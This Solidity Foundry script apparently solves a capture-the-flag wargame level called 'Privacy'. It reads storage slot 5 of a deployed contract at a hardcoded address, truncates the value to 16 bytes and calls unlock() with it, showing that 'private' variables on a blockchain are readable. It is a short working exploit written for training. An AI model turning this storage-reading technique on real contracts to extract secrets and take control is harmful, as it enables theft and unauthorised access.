// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {
    Privacy privacyInstance = Privacy(payable(0xea6f1344BBf3326E87745d76F247CfDA97aB86Cc));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 dataSlot5 = vm.load(address(privacyInstance), bytes32(uint256(5)));
        bytes16 key = bytes16(dataSlot5);
        privacyInstance.unlock(key);
        vm.stopBroadcast();
    }
}